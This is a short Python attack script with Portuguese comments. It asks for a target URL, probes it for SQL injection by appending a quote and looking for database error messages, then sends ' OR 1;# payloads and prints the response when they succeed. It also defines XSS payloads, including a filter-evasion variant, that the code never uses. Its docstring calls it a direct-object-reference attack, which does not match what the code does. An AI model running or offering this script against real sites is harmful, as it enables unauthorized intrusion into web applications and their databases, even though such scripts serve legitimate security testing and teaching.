#!/usr/bin/env python
# -*- coding: UTF-8 -*-

"""
  Este arquivo faz uma
  tentativa de ataque a
  Referência de Objeto Direto

  Modificado em 28 de fevereiro de 2017
  por Vitor Mazuco (vitor.mazuco@gmail.com)
"""

# Importando as bibliotecas necessárias.
import requests

# Solicitar a URL ao usuário
url = input("Digite a URL alvo: ")
initial = "'"

# Tipos de payload para testes
secondary = ["' OR 1;#", " OR 1;#"]
payloads = ['<script>alert(1);</script>', '<scrscriptipt>alert(1);</scrscriptipt>', '<BODY ONLOAD=alert(1)>']

try:
    first = requests.post(url+initial)
    if "mysql" in first.text.lower() or "native client" in first.text.lower() or "syntax error" in first.text.lower():
        print("Injetável")
        for payload in secondary:
            req = requests.post(url+payload)
            if payload in req.text:
                print("Parâmetro vulnerável\r\n")
                print("Atacando com a string: "+payload)
                print(req.text)
                break
            else:
                print("Não é vulnerável")
    else:
        print("Não Injetável")
except Exception as e:
    print(f"Ocorreu um erro: {e}")
